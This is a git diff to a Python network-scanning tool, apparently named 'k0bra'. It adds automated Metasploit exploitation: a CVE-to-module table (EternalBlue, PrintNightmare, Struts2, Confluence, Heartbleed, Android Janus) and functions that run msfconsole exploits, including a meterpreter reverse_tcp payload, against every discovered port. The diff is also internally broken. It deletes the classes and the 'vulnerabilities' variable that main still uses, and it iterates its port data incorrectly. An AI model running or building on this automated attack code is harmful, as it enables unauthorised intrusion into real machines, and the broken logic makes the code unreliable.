@@ -22,6 +22,25 @@ RESET = "\033[0m"
 # Logging configuration
 logging.basicConfig(filename='k0bra.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
 
+# Metasploit module mapping
+METASPLOIT_MODULES = {
+    "SMB": {
+        "CVE-2017-0143": "exploit/windows/smb/ms17_010_eternalblue",
+        "CVE-2021-34527": "exploit/windows/smb/printnightmare",
+    },
+    "HTTP": {
+        "CVE-2017-5638": "exploit/multi/http/struts2_content_type_ognl",
+        "CVE-2021-26084": "exploit/multi/http/confluence_widget_connector_rce",
+    },
+    "SSL": {
+        "CVE-2014-0160": "auxiliary/scanner/ssl/openssl_heartbleed",
+    },
+    "Android": {
+        "CVE-2017-13156": "exploit/android/local/janus",
+        "CVE-2021-0938": "exploit/android/local/put_user_vroot",
+    },
+}
+
 def print_banner():
     """
     Prints the banner for the tool.
@@ -98,123 +117,43 @@ class NetworkSecurityTool:
                 writer.writerow([ip, ', '.join(map(str, ports)), ', '.join(vulnerability_list), risk_score])
         print(GREEN + "Scan report saved as scan_report.csv" + RESET)
 
-class NetworkDiscovery:
-    def network_scan(self, target):
-        """
-        Perform network discovery using ICMP, ARP, TCP, and UDP scans
-        
-        Args:
-            target (str): Network range to scan
-        
-        Returns:
-            dict: Discovered network topology
-        """
-        network_info = {}
-
-        # ICMP Ping Scan
-        icmp_response = scapy.sr1(scapy.IP(dst=target)/scapy.ICMP(), timeout=2, verbose=False)
-        if icmp_response:
-            network_info[target] = 'Alive (via ICMP)'
-
-        # ARP Scan (Layer 2 discovery)
-        arp_response = scapy.arping(target, timeout=2, verbose=False)
-        for sent, received in arp_response:
-            network_info[received.psrc] = 'Alive (via ARP)'
-
-        return network_info
-
-    def port_enumeration(self, host):
-        """Perform port scanning using Nmap (TCP + UDP)"""
-        nm = nmap.PortScanner()
-        nm.scan(hosts=host, arguments="-p 1-65535 -sS -sU")  # SYN scan (TCP) + UDP scan
-        open_ports = {'TCP': [], 'UDP': []}
-
-        # Check TCP ports
-        if 'tcp' in nm[host]:
-            open_ports['TCP'] = [port for port in nm[host]['tcp'] if nm[host]['tcp'][port]['state'] == 'open']
-
-        # Check UDP ports
-        if 'udp' in nm[host]:
-            open_ports['UDP'] = [port for port in nm[host]['udp'] if nm[host]['udp'][port]['state'] == 'open']
-
-        return open_ports
-
-class VulnerabilityScanner:
-    def __init__(self, cve_database_path):
-        """
-        Initialize vulnerability assessment engine
-        
-        Args:
-            cve_database_path (str): Path to local CVE database JSON file
-        """
-        self.cve_database = self._load_cve_database(cve_database_path)
-
-    def _load_cve_database(self, path):
-        """Load and parse CVE database from a local JSON file"""
-        try:
-            with open(path, 'r') as file:
-                cve_data = json.load(file)
-                return cve_data
-        except Exception as e:
-            self.logger.error(f"Error loading CVE database: {str(e)}")
-            return {}
-
-    def assess_vulnerabilities(self, service_info):
-        """Match discovered services with vulnerabilities"""
-        vulnerabilities = {}
-        for service, version in service_info.items():
-            if service in self.cve_database:
-                vulnerabilities[service] = self.cve_database[service]
-        return vulnerabilities
-
-    def calculate_risk(self, cve_data):
-        """Calculate risk score based on CVSS v3"""
-        try:
-            cvss_score = cve_data.get("cvss_v3", {}).get("base_score", 0)
-            if cvss_score >= 9:
-                return "Critical", cvss_score
-            elif cvss_score >= 7:
-                return "High", cvss_score
-            elif cvss_score >= 4:
-                return "Medium", cvss_score
-            else:
-                return "Low", cvss_score
-        except KeyError:
-            return "Unknown", 0
-
-class NetworkVisualizer:
-    def create_topology_graph(self, network_map):
-        """
-        Create an interactive network topology visualization
-        
-        Args:
-            network_map (dict): Discovered network infrastructure
-        
-        Returns:
-            plotly.Figure: Interactive network graph
-        """
-        nodes = list(network_map.keys())
-        edges = [(node, "gateway") for node in nodes]  # Example: connecting all nodes to a gateway
-
-        fig = go.Figure(data=[go.Scatter(x=[i for i in range(len(nodes))],
-                                        y=[i for i in range(len(nodes))],
-                                        mode="markers+text",
-                                        text=nodes)])
-
-        fig.update_layout(title="Network Topology", showlegend=False)
-        return fig
-
-# Metasploit Integration (Example)
-def metasploit_exploit(target_ip, target_port):
+def metasploit_exploit(target_ip, target_port, service, cve_id):
     """
-    Run Metasploit exploitation module (example, customize with actual modules)
+    Automatically run Metasploit module based on service and CVE.
     
     Args:
-        target_ip (str): Target IP address to exploit
-        target_port (int): Open port to exploit
+        target_ip (str): Target IP address
+        target_port (int): Open port
+        service (str): Detected service (e.g., SMB, HTTP)
+        cve_id (str): CVE ID linked to the vulnerability
+    """
+    if service in METASPLOIT_MODULES and cve_id in METASPLOIT_MODULES[service]:
+        module = METASPLOIT_MODULES[service][cve_id]
+        try:
+            command = f"msfconsole -x 'use {module}; set RHOSTS {target_ip}; set RPORT {target_port}; exploit'"
+            print(YELLOW + f"Running Metasploit module for {service} ({cve_id}): {module}" + RESET)
+            subprocess.run(command, shell=True, check=True)
+        except subprocess.CalledProcessError as e:
+            print(RED + f"Metasploit exploit failed: {str(e)}" + RESET)
+    else:
+        print(RED + f"No Metasploit module found for {service} and CVE {cve_id}" + RESET)
+
+def metasploit_exploit_android(target_ip, target_port, module, payload="android/meterpreter/reverse_tcp"):
+    """
+    Run an Android-specific Metasploit module.
+    
+    Args:
+        target_ip (str): Target IP address
+        target_port (int): Open port
+        module (str): Metasploit module to run
+        payload (str): Payload to use (default: Meterpreter Reverse TCP)
     """
     try:
-        command = f"msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target_ip}; set RPORT {target_port}; exploit'"
+        command = (
+            f"msfconsole -x 'use {module}; set RHOSTS {target_ip}; set RPORT {target_port}; "
+            f"set PAYLOAD {payload}; exploit'"
+        )
+        print(YELLOW + f"Running Android Metasploit module: {module} with payload: {payload}" + RESET)
         subprocess.run(command, shell=True, check=True)
     except subprocess.CalledProcessError as e:
         print(RED + f"Metasploit exploit failed: {str(e)}" + RESET)
@@ -233,26 +172,19 @@ async def main():
     network_info = discovery.network_scan(target_network)
     open_ports = discovery.port_enumeration('192.168.1.10')
 
-    # Vulnerability scanning
-    vulnerabilities = scanner.assess_vulnerabilities({'Apache': '2.4.1', 'OpenSSH': '8.4'})
+    # Automated exploitation using Metasploit
+    for ip, ports in open_ports.items():
+        for port in ports.get("TCP", []):
+            metasploit_exploit(ip, port, 'SMB', 'CVE-2017-0143')  # Example for SMB
+        for port in ports.get("UDP", []):
+            metasploit_exploit(ip, port, 'SSL', 'CVE-2014-0160')  # Example for SSL
+        for port in ports.get("TCP", []):
+            if port == 5555:  # Example for Android Debug Bridge
+                metasploit_exploit_android(ip, port, "exploit/android/local/janus")
 
-    # Example exploitation (for demonstration only, use responsibly)
-    for ip in network_info.keys():
-        for port in open_ports:
-            metasploit_exploit(ip, port)  # Exploit using Metasploit
-
-    # Create a network visualization
-    topology = visualizer.create_topology_graph(network_info)
-
-    # Output results
-    print("Network Info:", network_info)
-    print("Open Ports:", open_ports)
-    print("Vulnerabilities:", vulnerabilities)
-    
-    # Save report as CSV
+    # Save results and show visualization
     tool.save_report(network_info, open_ports, vulnerabilities)
-    
-    # Show visualization
+    topology = visualizer.create_topology_graph(network_info)
     topology.show()
 
 # Start asynchronous main function
